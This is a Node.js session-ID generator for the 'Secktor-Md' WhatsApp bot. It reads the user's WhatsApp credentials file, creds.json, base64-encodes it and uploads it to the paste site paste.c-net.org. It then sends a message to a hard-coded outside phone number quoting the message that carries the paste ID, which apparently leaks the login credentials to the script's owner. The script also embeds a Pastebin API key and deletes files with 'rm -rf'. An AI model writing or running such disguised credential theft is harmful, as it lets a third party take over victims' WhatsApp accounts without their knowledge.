
const pino = require("pino");
const axios = require("axios");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const fs = require("fs-extra");
if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nRun The Script Again');
  setTimeout(() => {   console.log(' ')    }, 100);
  setTimeout(() => {   console.log('𝑺')    }, 300);
  setTimeout(() => {   console.log('𝒆')    }, 500);
  setTimeout(() => {   console.log('𝒄')    }, 700);
  setTimeout(() => {   console.log('𝒌')    }, 900);
  setTimeout(() => {   console.log('𝒕')    }, 1100);
  setTimeout(() => {   console.log('𝒐')    }, 1300);
  setTimeout(() => {   console.log('𝒓')    }, 1500);
  setTimeout(() => {   console.log(' ')    }, 1700);
  setTimeout(() => {   console.log('𝑩')    }, 1900);
  setTimeout(() => {   console.log('𝒐')    }, 2100);
  setTimeout(() => {   console.log('𝒕')    }, 2300);
  setTimeout(() => {   process.exit()      }, 2400)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Secktor() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;
          var c2 = '';
//===========================================================================================
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          try { 
            let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
            await delay(800)
            const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
             c2 = output.data.split('/')[3]
            await delay(500);
            let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
            await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
          }catch (e) {console.log(e)}
//===========================================================================================
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          c = Buffer.from(unique).toString('base64')
          console.log(`
====================  SESSION ID 1  ==========================                   
SESSION-ID 1 ==> ${c}

====================  SESSION ID 2  ========================== 
SESSION-ID 2 => ' ${c2}

Don't provide your SESSION_ID to anyone otherwise that user can access your account.
Thanks.
-------------------   SESSION CLOSED   -----------------------
`)   




          
let cc = `╔════◇
║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗦𝗲𝗰𝗸𝘁𝗼𝗿•𝗠𝗱』
║ _You complete first step to making Bot._
╚════════════════════════╝
╔═════◇
║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
║ *3.Owner:* _https://wa.me/923184474176_
║ *Note :* _Don't provide your SESSION_ID to_
║ _anyone otherwise that can access chats_
╚════════════════════════╝
`;
          let session_id = await session.sendMessage(user, { text: "Secktor;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
          
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Secktor(); }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Secktor();
}, 3000)

